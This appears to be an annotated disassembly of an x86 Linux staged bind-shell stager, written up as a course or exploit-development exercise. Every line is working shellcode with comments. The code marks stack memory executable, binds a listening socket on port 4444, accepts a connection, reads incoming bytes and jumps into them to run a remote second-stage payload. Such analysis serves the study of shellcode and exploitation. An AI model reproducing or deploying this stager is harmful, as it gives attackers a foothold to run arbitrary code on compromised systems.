; http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html

00000000      push byte +0x7d           ; push 7d
00000002      pop eax                   ; SYSCALL(125) // man 2 mprotect
00000003      cdq                       ; clear EDX
00000004      mov dl,0x7                ; prot mode, 7 = READ/WRITE/EXEC
00000006      mov ecx,0x1000            ; size of memory will be 0x1000
0000000B      mov ebx,esp               ; pointer to memory will be esp
0000000D      and bx,0xf000             ; align the address in bx to a page (0x1000 is size of a page accord. to "getconf PAGE_SIZE")
00000012      int 0x80                  ; call mprotect(esp, 0x1000, 7)

00000014      xor ebx,ebx               ; Clear EBX
00000016      mul ebx                   ; Clear EAX, EDX
00000018      push ebx                  ; Push argument 0x00000000 (protocol of socket)
00000019      inc ebx                   ; socketcall number for SOCKET (found at /usr/include/linux/net.h)
0000001A      push ebx                  ; Push argument 0x00000001 (type of socket) SOCK_STREAM (see Assignment 1 for details)
0000001B      push byte +0x2            ; Push argument 0x2 (domain of socket) AF_INET (see Assignment 1 for details)
0000001D      mov ecx,esp               ; store pointer to 2, 00000001, 00000000 in ecx
0000001F      mov al,0x66               ; SYSCALL(0x66) // man 2 socketcall
00000021      int 0x80                  ; call socketcall(1, esp) -> socket(2, 1, 0) -> socket(AF_INET, SOCK_STREAM, 0) (see Assignment 1 for details)

00000023      push ecx                  ; [*(2, 1, 0)] // current top of stack
00000024      push byte +0x4            ; [4, *(2, 1, 0)] // stack
00000026      push esp                  ; [*(4), 4, *(2, 1, 0)] // stack
00000027      push byte +0x2            ; [2, ...] // stack
00000029      push byte +0x1            ; [1, 2, ...] // stack
0000002B      push eax                  ; [SOCKFD, 1, 2, *(4), 4, *(2, 1, 0)] // stack
0000002C      xchg eax,edi              ; mov SOCKFD into edi, edi into eax
0000002D      mov ecx,esp               ; ecx now points to [SOCKFD, 1, 2, *(4), 4, *(2, 1, 0)]
0000002F      push byte +0xe            ; socketcall number for setsockopt
00000031      pop ebx                   ; EBX holds 0xe
00000032      push byte +0x66           ; prepare for syscall to socketcall
00000034      pop eax                   ; SYSCALL(0x66) // man 2 socketcall // used for next line: /usr/include/asm-generic/socket.h
00000035      int 0x80                  ; call socketcall(14, esp) -> setsockopt(SOCKFD, 1, 2, *4, 4) -> setsockopt(SOCKFD, SOL_SOCKET, SO_REUSEADDR, *4, 4)

00000037      xchg eax,edi              ; restore SOCKFD into eax
00000038      add esp,byte +0x14        ; remove 0x14 (20) bytes from the stack
0000003B      pop ecx                   ; [*(2, 1, 0)]
0000003C      pop ebx                   ; 0x0000002 // man 2 bind
0000003D      pop esi                   ; 0x0000001 //
0000003E      push edx                  ; [0]
0000003F      push dword 0x5c110002     ; [0x5c110002, 0]
00000044      push byte +0x10           ; [0x10, 0x5c110002, 0]
00000046      push ecx                  ; [*(0x5c110002, 0), 0x10, 0x5c110002, 0]
00000047      push eax                  ; [SOCKFD, *(0x5c110002, 0), 0x10, 0x5c110002, 0]
00000048      mov ecx,esp               ; ecx now points to [SOCKFD, *(0x5c110002, 0), 0x10, 0x5c110002, 0]
0000004A      push byte +0x66           ; prepare for syscall to socketcall
0000004C      pop eax                   ; SYSCALL(0x66) // man 2 socketcall
0000004D      int 0x80                  ; call socketcall(2, esp) -> bind(SOCKFD, *sockaddr, sockaddr_len) -> bind(SOCKFD, {sin_family: 0x0002, sin_port: 0x115c (4444), sin_addr.s_addr: 0x00000000}, 0x10)

0000004F      shl ebx,1                 ; shift 2 left once, resulting in 4 // man 2 listen
00000051      mov al,0x66               ; SYSCALL(0x66) // man 2 socketcall
00000053      int 0x80                  ; call socketcall(4, esp) -> listen(SOCKFD, &ecx) // the address of ecx is just the backlog int, no worries

00000055      push eax                  ; push return value of 0
00000056      inc ebx                   ; inc ebx to 5 // man 2 accept
00000057      mov al,0x66               ; SYSCALL(0x66) // man 2 socketcall
00000059      mov [ecx+0x4],edx         ; ecx is now pointing to [SOCKFD, 0x00000000, 0x10] // we don't care about sockaddr returning to us
0000005C      int 0x80                  ; call socketcall(5, ecx) -> accept(SOCKFD, NULL, 0x00000010)

0000005E      xchg eax,ebx              ; move returned NEWFD into ebx, SOCKFD into eax
0000005F      mov dh,0xc                ; edx now 0x00000c00
00000061      mov al,0x3                ; SYSCALL(3) // man read
00000063      int 0x80                  ; read(NEWFD, ECX, 0xC00)

00000065      xchg ebx,edi              ; store NEWFD in edi
00000067      pop ebx                   ; pop 0x00000000 into ebx
00000068      mov al,0x6                ; SYSCALL(6) // man 2 close
0000006A      int 0x80                  ; close(0) // close stdin

0000006C      jmp ecx                   ; jump to data received from NEWFD (staged payload)
